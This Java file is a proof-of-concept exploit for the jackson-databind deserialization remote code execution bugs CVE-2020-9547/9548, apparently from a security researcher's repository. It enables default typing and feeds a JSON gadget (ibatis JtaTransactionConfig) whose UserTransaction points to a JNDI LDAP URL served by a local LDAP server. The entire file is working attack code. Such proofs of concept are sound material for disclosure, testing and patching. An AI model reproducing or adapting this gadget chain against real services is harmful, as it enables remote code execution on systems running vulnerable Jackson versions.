package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 *
 * jackson-databind <= 2.9.10.3 RCE，需要开启DefaultType (reported by threedr3am & V1ZkRA)
 *
 * CVE-2020-9547, CVE-2020-9548
 *
 * <dependency>
 *       <groupId>org.apache.ibatis</groupId>
 *       <artifactId>ibatis-sqlmap</artifactId>
 *       <version>2.3.4.726</version>
 * </dependency>
 *
 * <dependency>
 *       <groupId>javax</groupId>
 *       <artifactId>javaee-api</artifactId>
 *       <version>8.0.1</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class IbatisSqlmapPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    String json = "[\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\", {\"properties\": {\"UserTransaction\":\"ldap://localhost:43658/Calc\"}}]";
    mapper.readValue(json, Object.class);
  }

}
